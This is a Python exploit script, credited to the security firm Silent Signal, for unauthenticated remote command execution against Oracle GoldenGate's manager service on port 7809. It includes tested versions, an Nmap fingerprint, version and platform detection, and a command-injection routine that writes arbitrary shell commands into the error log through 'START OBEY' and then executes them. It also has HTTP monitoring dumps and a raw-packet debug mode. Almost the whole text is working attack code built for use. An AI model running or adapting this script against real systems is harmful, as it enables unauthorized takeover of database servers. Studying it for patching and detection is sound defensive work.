#!/usr/bin/env python
# Sources:
# https://silentsignal.hu/docs/S2_Oracle_GoldenGate_GOLDENSHOWER.py
# https://blog.silentsignal.eu/2017/05/08/fools-of-golden-gate/
#
# GOLDENSHOWER - Oracle GoldenGate unauthenticated RCE by Silent Signal
#
# Tested with:
#     Version 12.1.2.0.0 17185003 OGGCORE_12.1.2.0.0_PLATFORMS_130924.1316 Linux, x64, 64bit (optimized) Oracle 11g
#     Version 12.1.2.0.0 17185003 OGGCORE_12.1.2.0.0T1_PLATFORMS_140313.1216 Windows x64 (optimized) Oracle 12c
#
# Nmap service fingerprint example:
#     ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)========
#     SF-Port7809-TCP:V=7.12%I=7%D=2/20%Time=DEADBEEF%P=x86_64-unknown-linux-gnu
#     SF:%r(RPCCheck,2D,"\0\+\x20\x20ERROR\tMGR\x20did\x20not\x20recognize\x20th
#     SF:e\x20command\.\0")%r(DNSVersionBindReq,28,"\0&\x20\x20ERROR\tMGR\x20Did
#     SF:\x20Not\x20Recognize\x20Command\0")%r(DNSStatusRequest,28,"\0&\x20\x20E
#     SF:RROR\tMGR\x20Did\x20Not\x20Recognize\x20Command\0")%r(afp,28,"\0&\x20\x
#     SF:20ERROR\tMGR\x20Did\x20Not\x20Recognize\x20Command\0")%r(kumo-server,2D
#     SF:,"\0\+\x20\x20ERROR\tMGR\x20did\x20not\x20recognize\x20the\x20command\.
#     SF:\0");

import socket
import struct
import argparse

HOST = None
PORT = None
PLATFORM = None


def send_write(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    term_ch = "#"
    if PLATFORM == "win":
        term_ch = "&"

    cmd_ggsci = "GGSCI START OBEY x\nSHELL,%s %s " % (cmd, term_ch)
    cmd_ggsci = cmd_ggsci.replace(" ", "\x09")

    length = struct.pack(">H", len(cmd_ggsci))
    s.send(length + cmd_ggsci)
    r = s.recv(1024)
    print "[+] '%s' WRITTEN \nReceived: %s\n" % (cmd, repr(r))

    s.close()


def send_exec():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    cmd = "GGSCI START OBEY ggserr.log".replace(" ", "\x09")
    length = struct.pack(">H", len(cmd))
    s.send(length + cmd)
    r = s.recv(1024)
    print "[+] EXECUTED - Received: %s\n" % (repr(r))
    s.close()


def monitor():
    if PLATFORM == "win":
        print "[!] Windows platform detected, this may not work!"

    import requests
    paths = ["messages", "registry", "statuschanges", "mpoints"]
    for p in paths:
        r = requests.get("http://%s:%d/%s" % (HOST, PORT, p))
        print "\n--- MONITOR - %s ---" % (p)
        print r.text


def version():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    #cmd = "GGSCI VERSION".replace(" ","\x09")
    cmd = "GGSCI\tVERSION"
    length = struct.pack(">H", len(cmd))
    s.send(length + cmd)
    r = s.recv(1024)
    ver = r[5:].replace("\t", " ")
    print "[+] VERSION: %s\n" % (ver)
    s.close()
    return ver


def debug(cmd, l=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    length = None
    if l is None:
        length = struct.pack(">H", len(cmd))
    else:
        length = struct.pack(">H", l)
    s.send(length + cmd)
    print "[+] Sent: %s" % (repr(length + cmd))
    r = s.recv(1024)
    print "[+] Received: %s\n" % (repr(r))
    s.close()


parser = argparse.ArgumentParser(
    description='GOLDENSHOWER - Oracle GoldenGate unauthenticated RCE by Silent Signal')
parser.add_argument("--host", help="Target host")
parser.add_argument("--port", help="Target port", type=int, default=7809)
parser.add_argument("--cmd", help="Command(s) to execute", nargs='*')
parser.add_argument(
    "--monitor", help="Dump information (incl. version) via HTTP monitoring functions", action="store_true")
parser.add_argument("--debugcmd", help="Send raw content", required=False)
parser.add_argument("--debuglen", help="Indicated size of raw content",
                    type=int, default=None, required=False)

args = parser.parse_args()

HOST = args.host
PORT = args.port

ver = version()

if "Windows" in ver:
    PLATFORM = "win"
    print "[+] Platform: Windows"
else:
    PLATFORM = "nix"
    print "[+] Platform: *nix"

if args.cmd:
    for c in args.cmd:
        send_write(c)
    send_exec()

if args.monitor:
    monitor()

if args.debugcmd:
    debug(args.debugcmd, args.debuglen)

# Signature: aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj0wNHZINFdfOVJmZw==